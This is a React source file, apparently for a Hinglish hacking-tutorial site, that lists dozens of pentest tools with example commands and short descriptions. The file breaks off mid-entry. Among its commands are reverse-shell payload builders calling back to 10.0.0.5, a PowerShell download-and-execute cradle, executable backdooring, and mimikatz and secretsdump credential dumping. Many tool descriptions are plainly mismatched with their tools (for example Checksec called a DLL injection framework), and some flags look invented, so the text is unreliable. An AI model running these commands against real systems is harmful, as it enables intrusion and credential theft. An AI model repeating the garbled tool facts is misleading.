import { useState, useEffect } from 'react'
import { Link } from 'react-router-dom'
import TutorialLayout from '../components/TutorialLayout'
import CodeBlock from '../components/CodeBlock'

const tools = [
  {
    name: 'Aircrack ng',
    slug: 'aircrack-ng',
    category: 'WiFi',
    commands: ['aircrack-ng --help', 'aircrack-ng -v', 'aircrack-ng -a2 -b 00:11:22:33:44:55 capture.cap'],
    description: 'WiFi deauthentication aur wireless testing. Termux Android par bhi available — Aircrack ng iske liye kaam aata hai.',
  },
  {
    name: 'Airgeddon',
    slug: 'airgeddon',
    category: 'WiFi',
    commands: ['airgeddon --help', 'airgeddon -v', 'airgeddon --attack wpa_handshake --interface wlan0mon'],
    description: 'WiFi enterprise security testing aur 802.1X authentication auditing. Iske liye Airgeddon ek comprehensive toolkit hai.',
  },
  {
    name: 'Bully',
    slug: 'bully',
    category: 'WiFi',
    commands: ['bully --help', 'bully -v', 'bully -b 00:11:22:33:44:55 -p 1234 wlan0mon'],
    description: 'Wireless client deauthentication testing aur captive portal analysis ke liye Bully ek specialized tool ke roop mein use hota hai.',
  },
  {
    name: 'Cowpatty',
    slug: 'cowpatty',
    category: 'WiFi',
    commands: ['cowpatty --help', 'cowpatty -v', 'cowpatty -r capture.cap -s MyWiFi -d wordlist.txt'],
    description: 'Ek advanced tool — wireless network auditing aur WPA/WPA2 security testing ke liye.',
  },
  {
    name: 'Eaphammer',
    slug: 'eaphammer',
    category: 'WiFi',
    commands: ['eaphammer --help', 'eaphammer -v', 'eaphammer --cert-wizard --create-pki --hostname portal.lan'],
    description: 'WiFi network reconnaissance aur wireless security assessment. Eaphammer powerful tool in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Fern WiFi Cracker',
    slug: 'fern-wifi',
    category: 'WiFi',
    commands: ['fern-wifi --help', 'fern-wifi -v', 'fern-wifi-cracker -i wlan0mon -w wordlist.txt -q'],
    description: 'WiFi PMKID capture aur WPA3 transitional mode testing. Fern WiFi Cracker innovative security tool in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Fluxion',
    slug: 'fluxion',
    category: 'WiFi',
    commands: ['fluxion --help', 'fluxion -v', 'fluxion -i wlan0mon -t 10 --hash-handshake'],
    description: 'Ek reliable automated tool — WPS pin cracking aur WiFi router vulnerability assessment ke liye.',
  },
  {
    name: 'Hcxdumptool',
    slug: 'hcxdumptool',
    category: 'WiFi',
    commands: ['hcxdumptool --help', 'hcxdumptool -v', 'hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=1'],
    description: 'Wireless access point discovery aur WiFi penetration testing. Iske liye Hcxdumptool ek specialized utility hai.',
  },
  {
    name: 'Hostapd mana',
    slug: 'hostapd-mana',
    category: 'WiFi',
    commands: ['hostapd-mana --help', 'hostapd-mana -v', 'hostapd-mana /etc/hostapd-mana/mana.conf'],
    description: 'Wireless frame injection aur packet replay attack execution. Iske liye Hostapd mana ek powerful utility hai.',
  },
  {
    name: 'Kismet',
    slug: 'kismet',
    category: 'WiFi',
    commands: ['kismet --help', 'kismet -v', 'kismet -c wlan0mon --verbose'],
    description: 'WiFi packet capture aur wireless network vulnerability assessment ke liye Kismet ek comprehensive tool ke roop mein use hota hai.',
  },
  {
    name: 'Macchanger',
    slug: 'macchanger',
    category: 'WiFi',
    commands: ['macchanger --help', 'macchanger -v', 'macchanger -r wlan0 --mac XX:XX:XX:XX:XX:XX'],
    description: 'WiFi network encryption cracking aur wireless penetration testing ke liye Macchanger ek reliable solution ke roop mein use hota hai.',
  },
  {
    name: 'Mana Toolkit',
    slug: 'mana-toolkit',
    category: 'WiFi',
    commands: ['mana-toolkit --help', 'mana-toolkit -v', 'mana-toolkit -i wlan0mon -l /tmp/creds'],
    description: 'Mana Toolkit ek advanced scanning utility hai jo WiFi beacon analysis aur access point signal monitoring mein help karta hai.',
  },
  {
    name: 'MDK3',
    slug: 'mdk3',
    category: 'WiFi',
    commands: ['mdk3 --help', 'mdk3 -v', 'mdk3 wlan0mon d -c 6 -b blacklist.txt'],
    description: 'MDK3 ek multi-purpose tool hai jo wireless LAN security auditing aur WiFi reconnaissance mein help karta hai.',
  },
  {
    name: 'MDK4',
    slug: 'mdk4',
    category: 'WiFi',
    commands: ['mdk4 --help', 'mdk4 -v', 'mdk4 wlan0mon b -c 6 blacklist.txt'],
    description: 'MDK4 ek professional monitoring tool hai jo wireless spectrum analysis aur channel interference detection mein help karta hai.',
  },
  {
    name: 'Pixiewps',
    slug: 'pixiewps',
    category: 'WiFi',
    commands: ['pixiewps --help', 'pixiewps -v', 'pixiewps -e PKe -r PKr -s1 -m1 -a -n pin'],
    description: 'Wireless authentication testing aur WiFi protocol analysis. Pixiewps specialized toolkit in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Reaver',
    slug: 'reaver',
    category: 'WiFi',
    commands: ['reaver --help', 'reaver -v', 'reaver -i wlan0mon -b 00:11:22:33:44:55 -vv'],
    description: 'Ek multi-purpose scanner — rogue access point detection aur evil twin attack implementation ke liye.',
  },
  {
    name: 'Sslstrip',
    slug: 'sslstrip',
    category: 'WiFi',
    commands: ['sslstrip --help', 'sslstrip -v', 'sslstrip -l 8080 -a -w sslstrip.log'],
    description: 'Wireless interface monitoring aur WiFi attack vectors ko execute karne. Iske liye Sslstrip ek essential tool hai.',
  },
  {
    name: 'Wash',
    slug: 'wash',
    category: 'WiFi',
    commands: ['wash --help', 'wash -v', 'wash -i wlan0mon -C'],
    description: 'Wireless network analysis aur access point security auditing. Wash versatile tool in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Wifite',
    slug: 'wifite',
    category: 'WiFi',
    commands: ['wifite --help', 'wifite -v', 'wifite --wpadt --pmkid --wpa --dict wordlist.txt'],
    description: 'Termux Android par wireless testing. Wifite automated wifi attack tool ke liye use karein.',
  },
  {
    name: 'Amass',
    slug: 'amass',
    category: 'Recon',
    commands: ['amass --help', 'amass -v', 'amass enum -d example.com -o domains.txt'],
    description: 'Amass ek essential utility hai jo target enumeration aur open source intelligence collection mein help karta hai.',
  },
  {
    name: 'Arp scan',
    slug: 'arp-scan',
    category: 'Recon',
    commands: ['arp-scan --help', 'arp-scan -v', 'arp-scan --localnet --interface eth0'],
    description: 'Arp scan ek specialized network tool hai jo IPv6 host enumeration aur link-local address scanning mein help karta hai.',
  },
  {
    name: 'BIND9',
    slug: 'bind9',
    category: 'Recon',
    commands: ['bind9 --help', 'bind9 -v', 'dig @8.8.8.8 example.com ANY +short'],
    description: 'BIND9 ek automated recon utility hai jo API endpoint discovery aur web service enumeration mein help karta hai.',
  },
  {
    name: 'Bloodhound',
    slug: 'bloodhound',
    category: 'Recon',
    commands: ['bloodhound --help', 'bloodhound -v', 'bloodhound-python -d example.local -u user -p pass -gc dc.example.local'],
    description: 'Ek comprehensive solution — target metadata analysis aur digital footprinting ke liye.',
  },
  {
    name: 'Bluelog',
    slug: 'bluelog',
    category: 'Recon',
    commands: ['bluelog --help', 'bluelog -v', 'bluelog -i hci0 -v -l scan.log'],
    description: 'Passive reconnaissance aur target intelligence collection. Bluelog advanced solution in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'BlueSnarfer',
    slug: 'bluesnarfer',
    category: 'Recon',
    commands: ['bluesnarfer --help', 'bluesnarfer -v', 'bluesnarfer -b 00:11:22:33:44:55 -r'],
    description: 'Ek specialized network intelligence tool — honeypot detection aur fake service identification ke liye.',
  },
  {
    name: 'CutyCapt',
    slug: 'cutycapt',
    category: 'Recon',
    commands: ['cutycapt --help', 'cutycapt -v', 'cutycapt --url=https://example.com --out=screenshot.png'],
    description: 'Ek practical recon tool — whois lookup aur DNS record analysis ke liye.',
  },
  {
    name: 'DMitry',
    slug: 'dmitry',
    category: 'Recon',
    commands: ['dmitry --help', 'dmitry -v', 'dmitry -winse example.com'],
    description: 'DMitry ek specialized utility hai jo email harvesting aur web intelligence gathering mein help karta hai.',
  },
  {
    name: 'DNSchef',
    slug: 'dnschef',
    category: 'Recon',
    commands: ['dnschef --help', 'dnschef -v', 'dnschef --fakeip 127.0.0.1 --logfile dns.log'],
    description: 'OSINT framework integration aur automated reconnaissance. DNSchef advanced tool in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Dnsenum',
    slug: 'dnsenum',
    category: 'Recon',
    commands: ['dnsenum --help', 'dnsenum -v', 'dnsenum --enum example.com -f subdomains.txt -o dns.txt'],
    description: 'Cloud metadata service enumeration aur IAM role discovery. Dnsenum advanced cloud recon tool in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Dnsmap',
    slug: 'dnsmap',
    category: 'Recon',
    commands: ['dnsmap --help', 'dnsmap -v', 'dnsmap example.com -w wordlist.txt -r results.txt'],
    description: 'Domain age analysis aur historical WHOIS data lookup. Dnsmap professional reconnaissance tool in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Dnsrecon',
    slug: 'dnsrecon',
    category: 'Recon',
    commands: ['dnsrecon --help', 'dnsrecon -v', 'dnsrecon -d example.com -t axfr --json'],
    description: 'Certificate transparency log analysis aur subdomain discovery. Dnsrecon specialized tool in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Dradis',
    slug: 'dradis',
    category: 'Recon',
    commands: ['dradis --help', 'dradis -v', 'dradis start --port 3000'],
    description: 'Mail server enumeration aur SMTP banner analysis. Iske liye Dradis ek practical recon framework hai.',
  },
  {
    name: 'Enum4linux',
    slug: 'enum4linux',
    category: 'Recon',
    commands: ['enum4linux --help', 'enum4linux -v', 'enum4linux -a 192.168.1.10 -l enum.log'],
    description: 'Network range scanning aur live service detection ke liye Enum4linux ek fast utility ke roop mein use hota hai.',
  },
  {
    name: 'Faraday',
    slug: 'faraday',
    category: 'Recon',
    commands: ['faraday --help', 'faraday -v', 'faraday-server --port 5985 --password secret'],
    description: 'Information gathering aur OSINT data collection. Faraday comprehensive utility in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Fierce',
    slug: 'fierce',
    category: 'Recon',
    commands: ['fierce --help', 'fierce -v', 'fierce --domain example.com --subdomains subdomains.txt'],
    description: 'Fierce ek fast aur reliable tool hai jo target reconnaissance aur subdomain enumeration mein help karta hai.',
  },
  {
    name: 'Finger',
    slug: 'finger',
    category: 'Recon',
    commands: ['finger --help', 'finger -v', 'finger -l user@example.com'],
    description: 'Finger ek advanced OSINT framework hai jo passive total api integration aur historical DNS data analysis mein help karta hai.',
  },
  {
    name: 'IKE-Scan',
    slug: 'ike-scan',
    category: 'Recon',
    commands: ['ike-scan --help', 'ike-scan -v', 'ike-scan -M -A example.com --showbackoff'],
    description: 'Wayback machine analysis aur historical web content discovery ke liye IKE-Scan ek archival recon tool ke roop mein use hota hai.',
  },
  {
    name: 'KeepNote',
    slug: 'keepnote',
    category: 'Recon',
    commands: ['keepnote --help', 'keepnote -v', 'keepnote --import /tmp/notes.xml'],
    description: 'KeepNote ek comprehensive security scanner hai jo threat intelligence feed integration aur IOC correlation mein help karta hai.',
  },
  {
    name: 'LBD',
    slug: 'lbd',
    category: 'Recon',
    commands: ['lbd --help', 'lbd -v', 'lbd example.com'],
    description: 'SSL/TLS certificate analysis aur cipher suite detection. Iske liye LBD ek security assessment tool hai.',
  },
  {
    name: 'Maltego',
    slug: 'maltego',
    category: 'Recon',
    commands: ['maltego --help', 'maltego -v', 'maltego --run Transform --entity example.com'],
    description: 'Social media intelligence gathering aur username enumeration. Iske liye Maltego ek advanced OSINT tool hai.',
  },
  {
    name: 'Masscan',
    slug: 'masscan',
    category: 'Recon',
    commands: ['masscan --help', 'masscan -v', 'masscan 10.0.0.0/8 -p80,443,22 --rate=1000 -oJ scan.json'],
    description: 'Masscan — fast port scanner. Termux Android mein mass scanning ke liye best.',
  },
  {
    name: 'Metagoofil',
    slug: 'metagoofil',
    category: 'Recon',
    commands: ['metagoofil --help', 'metagoofil -v', 'metagoofil -d example.com -t pdf,xls -l 20 -o docs/'],
    description: 'Passive DNS analysis aur network information gathering. Metagoofil reliable tool in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Naabu',
    slug: 'naabu',
    category: 'Recon',
    commands: ['naabu --help', 'naabu -v', 'naabu -host 10.0.0.0/24 -p 80,443,22 -o ports.txt'],
    description: 'Naabu ek specialized investigation utility hai jo dark web intelligence aur breach data correlation mein help karta hai.',
  },
  {
    name: 'NBTScan',
    slug: 'nbtscan',
    category: 'Recon',
    commands: ['nbtscan --help', 'nbtscan -v', 'nbtscan -r 192.168.1.0/24'],
    description: 'Ek efficient recon scanner — ASN mapping aur IP range ownership identification ke liye.',
  },
  {
    name: 'Netdiscover',
    slug: 'netdiscover',
    category: 'Recon',
    commands: ['netdiscover --help', 'netdiscover -v', 'netdiscover -r 192.168.1.0/24 -i eth0 -P'],
    description: 'Netdiscover ek professional OSINT framework hai jo GitHub reconnaissance aur repository metadata analysis mein help karta hai.',
  },
  {
    name: 'Nmap',
    slug: 'nmap',
    category: 'Recon',
    commands: ['nmap --help', 'nmap -v', 'nmap -sV -sC -A -p- -T4 target.com -oN scan.nmap'],
    description: 'Network scanning aur port discovery. Iske liye Nmap ek powerful tool. Termux Android mein bhi use karein hai.',
  },
  {
    name: 'P0f',
    slug: 'p0f',
    category: 'Recon',
    commands: ['p0f --help', 'p0f -v', 'p0f -i eth0 -o p0f.log -f p0f.fp'],
    description: 'Target enumeration automation aur data aggregation. Iske liye P0f ek powerful framework hai.',
  },
  {
    name: 'Recon ng',
    slug: 'recon-ng',
    category: 'Recon',
    commands: ['recon-ng --help', 'recon-ng -v', 'recon-ng -r recon-script.rc'],
    description: 'Web reconnaissance framework. Termux Android mein OSINT ke liye use karein — Recon ng iske liye kaam aata hai.',
  },
  {
    name: 'RPCBind',
    slug: 'rpcbind',
    category: 'Recon',
    commands: ['rpcbind --help', 'rpcbind -v', 'rpcinfo -p 192.168.1.10'],
    description: 'Ek practical OSINT toolkit — twitter intelligence gathering aur social media footprint analysis ke liye.',
  },
  {
    name: 'Sherlock',
    slug: 'sherlock',
    category: 'Recon',
    commands: ['sherlock --help', 'sherlock -v', 'sherlock user123 --output results.txt'],
    description: 'Sherlock ek fast aur lightweight tool hai jo network mapping aur live host discovery mein help karta hai.',
  },
  {
    name: 'Showmount',
    slug: 'showmount',
    category: 'Recon',
    commands: ['showmount --help', 'showmount -v', 'showmount -e 192.168.1.10'],
    description: 'Reconnaissance automation aur target profiling. Iske liye Showmount ek multi-functional tool hai.',
  },
  {
    name: 'SMBClient',
    slug: 'smbclient',
    category: 'Recon',
    commands: ['smbclient --help', 'smbclient -v', 'smbclient -L //192.168.1.10 -N'],
    description: 'SMBClient ek modern devops recon utility hai jo container registry scanning aur image metadata analysis mein help karta hai.',
  },
  {
    name: 'SMBMap',
    slug: 'smbmap',
    category: 'Recon',
    commands: ['smbmap --help', 'smbmap -v', 'smbmap -H 192.168.1.10 -u guest -p ""'],
    description: 'Network reconnaissance aur service discovery ke liye SMBMap ek powerful scanning tool ke roop mein use hota hai.',
  },
  {
    name: 'SNMP-Check',
    slug: 'snmp-check',
    category: 'Recon',
    commands: ['snmp-check --help', 'snmp-check -v', 'snmp-check -t 192.168.1.1 -c public'],
    description: 'Domain analysis aur network footprinting. Iske liye SNMP-Check ek versatile information gathering tool hai.',
  },
  {
    name: 'Sparta',
    slug: 'sparta',
    category: 'Recon',
    commands: ['sparta --help', 'sparta -v', 'sparta -i targets.txt -t 50'],
    description: 'Port scanning aur service fingerprinting. Iske liye Sparta ek efficient recon solution hai.',
  },
  {
    name: 'Spooftooph',
    slug: 'spooftooph',
    category: 'Recon',
    commands: ['spooftooph --help', 'spooftooph -v', 'spooftooph -i hci0 -n "NewName" -a 00:11:22:33:44:55'],
    description: 'Spooftooph ek reliable network utility hai jo reverse DNS lookup aur PTR record enumeration mein help karta hai.',
  },
  {
    name: 'SSLScan',
    slug: 'sslscan',
    category: 'Recon',
    commands: ['sslscan --help', 'sslscan -v', 'sslscan --targets=targets.txt --no-colour'],
    description: 'Subdomain discovery aur DNS analysis. SSLScan comprehensive recon toolkit in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'SSLyze',
    slug: 'sslyze',
    category: 'Recon',
    commands: ['sslyze --help', 'sslyze -v', 'sslyze --regular example.com:443'],
    description: 'Ek versatile profiling tool — web technology fingerprinting aur CMS detection ke liye.',
  },
  {
    name: 'Subfinder',
    slug: 'subfinder',
    category: 'Recon',
    commands: ['subfinder --help', 'subfinder -v', 'subfinder -d example.com -all -o subs.txt'],
    description: 'Geolocation data extraction aur IP address mapping. Iske liye Subfinder ek reliable recon utility hai.',
  },
  {
    name: 'Theharvester',
    slug: 'theharvester',
    category: 'Recon',
    commands: ['theharvester --help', 'theharvester -v', 'theharvester -d example.com -b google,linkedin -f results.html'],
    description: 'Theharvester ek reliable internet recon utility hai jo network block analysis aur BGP route enumeration mein help karta hai.',
  },
  {
    name: 'Unicornscan',
    slug: 'unicornscan',
    category: 'Recon',
    commands: ['unicornscan --help', 'unicornscan -v', 'unicornscan -Iv 192.168.1.0/24:1-65535'],
    description: 'Subdomain brute forcing aur permutation-based discovery. Iske liye Unicornscan ek high-performance scanner hai.',
  },
  {
    name: 'URLCrazy',
    slug: 'urlcrazy',
    category: 'Recon',
    commands: ['urlcrazy --help', 'urlcrazy -v', 'urlcrazy -p example.com -o results.csv'],
    description: 'JavaScript file analysis aur hidden API endpoint discovery. URLCrazy specialized web scanner in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Whois',
    slug: 'whois',
    category: 'Recon',
    commands: ['whois --help', 'whois -v', 'whois example.com | grep -E "Name|Organization|Country"'],
    description: 'Ek professional recon tool — target surface mapping aur asset discovery ke liye.',
  },
  {
    name: 'Armitage',
    slug: 'armitage',
    category: 'Exploitation',
    commands: ['armitage --help', 'armitage -v', 'armitage --connect 10.0.0.5:55553 --user msf'],
    description: 'Armitage ek advanced binary exploitation tool hai jo return oriented programming aur ROP chain automation mein help karta hai.',
  },
  {
    name: 'Backdoor Factory',
    slug: 'backdoor-factory',
    category: 'Exploitation',
    commands: ['backdoor-factory --help', 'backdoor-factory -v', 'backdoor-factory -f putty.exe -S -l -J -c -i 10.0.0.5 -p 4444 -o backdoored.exe'],
    description: 'Backdoor Factory ek specialized tool hai jo browser exploitation aur client-side attack vectors mein help karta hai.',
  },
  {
    name: 'Beef xss',
    slug: 'beef-xss',
    category: 'Exploitation',
    commands: ['beef-xss --help', 'beef-xss -v', 'beef-xss -c /etc/beef-xss/config.yaml'],
    description: 'Ek reliable tool — network-based exploitation aur service vulnerability testing ke liye.',
  },
  {
    name: 'Checksec',
    slug: 'checksec',
    category: 'Exploitation',
    commands: ['checksec --help', 'checksec -v', 'checksec --file=/bin/bash'],
    description: 'Checksec ek advanced code injection framework hai jo DLL injection aur process hollowing technique automation mein help karta hai.',
  },
  {
    name: 'Commix',
    slug: 'commix',
    category: 'Exploitation',
    commands: ['commix --help', 'commix -v', 'commix --url="http://target.com/page.php?id=1" --level=3'],
    description: 'Database exploitation aur SQL-based attack execution ke liye Commix ek powerful toolkit ke roop mein use hota hai.',
  },
  {
    name: 'Crackmapexec',
    slug: 'crackmapexec',
    category: 'Exploitation',
    commands: ['crackmapexec --help', 'crackmapexec -v', 'crackmapexec smb 192.168.1.0/24 -u admin -p password123'],
    description: 'Reverse shell generation aur command-and-control setup ke liye Crackmapexec ek essential tool ke roop mein use hota hai.',
  },
  {
    name: 'Empire',
    slug: 'empire',
    category: 'Exploitation',
    commands: ['empire --help', 'empire -v', 'python3 empire --rest --username admin --password password123'],
    description: 'Ek comprehensive attack toolkit — active directory exploitation aur domain privilege escalation ke liye.',
  },
  {
    name: 'Evil winrm',
    slug: 'evil-winrm',
    category: 'Exploitation',
    commands: ['evil-winrm --help', 'evil-winrm -v', 'evil-winrm -i 192.168.1.10 -u Administrator -p P@ssw0rd'],
    description: 'Buffer overflow exploitation aur memory corruption testing. Evil winrm specialized utility in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Exe2Hex',
    slug: 'exe2hex',
    category: 'Exploitation',
    commands: ['exe2hex --help', 'exe2hex -v', 'exe2hex -x /tmp/backdoor.exe -t cp -s 512'],
    description: 'Exe2Hex ek advanced kernel tool hai jo kernel exploit development aur privilege escalation module delivery mein help karta hai.',
  },
  {
    name: 'Impacket',
    slug: 'impacket',
    category: 'Exploitation',
    commands: ['impacket --help', 'impacket -v', 'impacket-secretsdump domain/user:pass@192.168.1.10'],
    description: 'Impacket ek advanced utility hai jo post-exploitation module execution aur lateral movement mein help karta hai.',
  },
  {
    name: 'Koadic',
    slug: 'koadic',
    category: 'Exploitation',
    commands: ['koadic --help', 'koadic -v', 'python3 koadic -s staging --host 10.0.0.5 --port 9999'],
    description: 'Service exploitation aur remote command execution. Iske liye Koadic ek reliable framework hai.',
  },
  {
    name: 'Merlin',
    slug: 'merlin',
    category: 'Exploitation',
    commands: ['merlin --help', 'merlin -v', 'merlinServer -i 0.0.0.0 -p 443 -x SHA256'],
    description: 'Deserialization attack execution aur .NET/Java object injection. Merlin reliable exploitation framework in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Metasploit framework',
    slug: 'metasploit-framework',
    category: 'Exploitation',
    commands: ['metasploit-framework --help', 'metasploit-framework -v', 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; run"'],
    description: 'Penetration testing framework. Termux Android par exploit development aur payload generation — Metasploit framework iske liye kaam aata hai.',
  },
  {
    name: 'Mimikatz',
    slug: 'mimikatz',
    category: 'Exploitation',
    commands: ['mimikatz --help', 'mimikatz -v', 'mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit'],
    description: 'Ek comprehensive tool — web application exploitation aur server-side attack execution ke liye.',
  },
  {
    name: 'MSFPayload',
    slug: 'msfpayload',
    category: 'Exploitation',
    commands: ['msfpayload --help', 'msfpayload -v', 'msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 X > payload.exe'],
    description: 'MSFPayload ek advanced framework hai jo client-side exploitation aur social engineering payloads mein help karta hai.',
  },
  {
    name: 'Msfvenom',
    slug: 'msfvenom',
    category: 'Exploitation',
    commands: ['msfvenom --help', 'msfvenom -v', 'msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o payload.apk'],
    description: 'Vulnerability scanning aur automated exploitation. Msfvenom multi-purpose framework in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Nishang',
    slug: 'nishang',
    category: 'Exploitation',
    commands: ['nishang --help', 'nishang -v', 'powershell -ExecutionPolicy Bypass -File Nishang.ps1'],
    description: 'Race condition exploitation aur time-of-check time-of-use attack. Iske liye Nishang ek advanced concurrency tool hai.',
  },
  {
    name: 'One Gadget',
    slug: 'one_gadget',
    category: 'Exploitation',
    commands: ['one_gadget --help', 'one_gadget -v', 'one_gadget /lib/x86_64-linux-gnu/libc.so.6'],
    description: 'Macro exploit delivery aur office document weaponization. Iske liye One Gadget ek practical social engineering tool hai.',
  },
  {
    name: 'PowerSploit',
    slug: 'powersploit',
    category: 'Exploitation',
    commands: ['powersploit --help', 'powersploit -v', 'powershell -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString(\"http://10.0.0.5/PowerUp.ps1\")"'],
    description: 'Ek comprehensive solution — payload crafting aur exploit delivery mechanism ke liye.',
  },
  {
    name: 'Pupy',
    slug: 'pupy',
    category: 'Exploitation',
    commands: ['pupy --help', 'pupy -v', 'python3 pupy.py --host 10.0.0.5 --port 443 --ssl'],
    description: 'Pupy ek stealth exploitation framework hai jo fileless malware delivery aur memory-only payload execution mein help karta hai.',
  },
  {
    name: 'Pwntools',
    slug: 'pwntools',
    category: 'Exploitation',
    commands: ['pwntools --help', 'pwntools -v', 'python3 -c "from pwn import *; e = ELF(\"./binary\"); print(e.checksec())"'],
    description: 'Pwntools ek versatile toolkit hai jo privilege escalation aur post-exploitation automation mein help karta hai.',
  },
  {
    name: 'Ropper',
    slug: 'ropper',
    category: 'Exploitation',
    commands: ['ropper --help', 'ropper -v', 'ropper --file /bin/ls --search "pop rdi"'],
    description: 'Ropper ek powerful penetration testing tool hai jo exploit development aur payload generation mein help karta hai.',
  },
  {
    name: 'Searchsploit',
    slug: 'searchsploit',
    category: 'Exploitation',
    commands: ['searchsploit --help', 'searchsploit -v', 'searchsploit apache 2.4.49 -o'],
    description: 'Exploit database search. Termux Android par exploit research tool — Searchsploit iske liye kaam aata hai.',
  },
  {
    name: 'Setoolkit',
    slug: 'setoolkit',
    category: 'Exploitation',
    commands: ['setoolkit --help', 'setoolkit -v', 'setoolkit -c "Social-Engineering Attacks" -m 1'],
    description: 'Ek professional toolkit — exploit chaining aur multi-stage attack execution ke liye.',
  },
  {
    name: 'ShellNoob',
    slug: 'shellnoob',
    category: 'Exploitation',
    commands: ['shellnoob --help', 'shellnoob -v', 'shellnoob -c 0x7fffffff -f linux/x64 -s execve -o shellcode.bin'],
    description: 'Web shell deployment aur persistent backdoor installation. ShellNoob reliable post-exploit utility in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Shellter',
    slug: 'shellter',
    category: 'Exploitation',
    commands: ['shellter --help', 'shellter -v', 'shellter --mode auto --input installer.exe --output infected.exe'],
    description: 'Shellter ek specialized memory corruption framework hai jo heap spray aur use-after-free vulnerability exploitation mein help karta hai.',
  },
  {
    name: 'SilentTrinity',
    slug: 'silenttrinity',
    category: 'Exploitation',
    commands: ['silenttrinity --help', 'silenttrinity -v', 'python3 SilentTrinity.py --client --host 10.0.0.5 --port 443'],
    description: 'Shellcode generation aur encoder/decoder utility ke liye SilentTrinity ek essential exploit development toolkit ke roop mein use hota hai.',
  },
  {
    name: 'THC-IPv6',
    slug: 'thc-ipv6',
    category: 'Exploitation',
    commands: ['thc-ipv6 --help', 'thc-ipv6 -v', 'thc-ipv6-fake-dns6 eth0 2001:db8::1 example.com'],
    description: 'Ek versatile post-exploit toolkit — scheduled task exploitation aur Windows persistence mechanism ke liye.',
  },
  {
    name: 'TrevorC2',
    slug: 'trevorc2',
    category: 'Exploitation',
    commands: ['trevorc2 --help', 'trevorc2 -v', 'python3 trevorc2_server.py -c config.json'],
    description: 'Vulnerability exploitation aur remote code execution ke liye TrevorC2 ek advanced attack framework ke roop mein use hota hai.',
  },
  {
    name: 'Veil',
    slug: 'veil',
    category: 'Exploitation',
    commands: ['veil --help', 'veil -v', 'veil -t Evasion -p python/shellcode_inject -o payload'],
    description: 'SSRF exploitation aur internal network pivot attack. Iske liye Veil ek comprehensive server-side tool hai.',
  },
  {
    name: 'Weevely',
    slug: 'weevely',
    category: 'Exploitation',
    commands: ['weevely --help', 'weevely -v', 'weevely http://target.com/uploads/shell.php password'],
    description: 'Weevely ek specialized credential tool hai jo pass the hash attack execution aur NTLM relay exploitation mein help karta hai.',
  },
  {
    name: 'Burpsuite',
    slug: 'burpsuite',
    category: 'Web',
    commands: ['burpsuite --help', 'burpsuite -v', 'java -jar burpsuite_pro.jar --project=target --config-file=config.json'],
    description: 'Web open redirect detection aur URL validation bypass testing. Iske liye Burpsuite ek practical redirect scanner hai.',
  },
  {
    name: 'Cadaver',
    slug: 'cadaver',
    category: 'Web',
    commands: ['cadaver --help', 'cadaver -v', 'cadaver http://target.com/webdav/'],
    description: 'Ek practical utility — web session analysis aur cookie security testing ke liye.',
  },
  {
    name: 'CMSMap',
    slug: 'cmsmap',
    category: 'Web',
    commands: ['cmsmap --help', 'cmsmap -v', 'cmsmap -t https://target.com -f Joomla -d'],
    description: 'Web form fuzzing aur input validation testing ke liye CMSMap ek reliable scanner ke roop mein use hota hai.',
  },
  {
    name: 'DavTest',
    slug: 'davtest',
    category: 'Web',
    commands: ['davtest --help', 'davtest -v', 'davtest -url http://target.com/webdav/'],
    description: 'Web subdomain takeover detection aur dangling DNS record analysis ke liye DavTest ek comprehensive asset scanner ke roop mein use hota hai.',
  },
  {
    name: 'Dirb',
    slug: 'dirb',
    category: 'Web',
    commands: ['dirb --help', 'dirb -v', 'dirb http://target.com /usr/share/wordlists/dirb/common.txt -o dirb.txt'],
    description: 'Dirb ek comprehensive framework hai jo web API security testing aur endpoint analysis mein help karta hai.',
  },
  {
    name: 'DirBuster',
    slug: 'dirbuster',
    category: 'Web',
    commands: ['dirbuster --help', 'dirbuster -v', 'dirbuster -u http://target.com -l /usr/share/wordlists/dirb/big.txt -r 200'],
    description: 'Web parameter analysis aur blind vulnerability detection. DirBuster specialized utility in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Ffuf',
    slug: 'ffuf',
    category: 'Web',
    commands: ['ffuf --help', 'ffuf -v', 'ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301 -t 50'],
    description: 'Web fuzzing aur directory brute force. Termux Android par fast scanning — Ffuf iske liye kaam aata hai.',
  },
  {
    name: 'Fimap',
    slug: 'fimap',
    category: 'Web',
    commands: ['fimap --help', 'fimap -v', 'fimap -u "http://target.com/page.php?id=1" -d -v'],
    description: 'Web server fingerprinting aur technology stack detection ke liye Fimap ek useful tool ke roop mein use hota hai.',
  },
  {
    name: 'Gobuster',
    slug: 'gobuster',
    category: 'Web',
    commands: ['gobuster --help', 'gobuster -v', 'gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50'],
    description: 'Gobuster — directory aur dns brute forcing. Termux Android mein use karein.',
  },
  {
    name: 'HTTP-Enum',
    slug: 'http-enum',
    category: 'Web',
    commands: ['http-enum --help', 'http-enum -v', 'http-enum -t 192.168.1.1 -p 80 -d /usr/share/nmap/nselib/data/http-enum-files.lst'],
    description: 'Web graphQL API inspection aur query injection testing. Iske liye HTTP-Enum ek modern web security utility hai.',
  },
  {
    name: 'HTTrack',
    slug: 'httrack',
    category: 'Web',
